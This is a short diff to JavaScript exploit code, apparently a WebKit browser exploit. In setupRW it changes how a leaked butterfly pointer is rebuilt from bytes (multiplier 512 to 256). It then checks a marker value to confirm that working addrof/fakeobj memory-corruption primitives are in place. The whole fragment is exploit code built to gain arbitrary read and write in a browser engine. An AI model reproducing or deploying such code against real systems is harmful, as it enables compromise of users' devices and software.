@@ -116,7 +116,7 @@ function setupRW() {
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
 	for(var i = 15; i >= 8; i--)
-		bf = 512 * bf + g_relative_rw[g_ab_index + i];
+		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
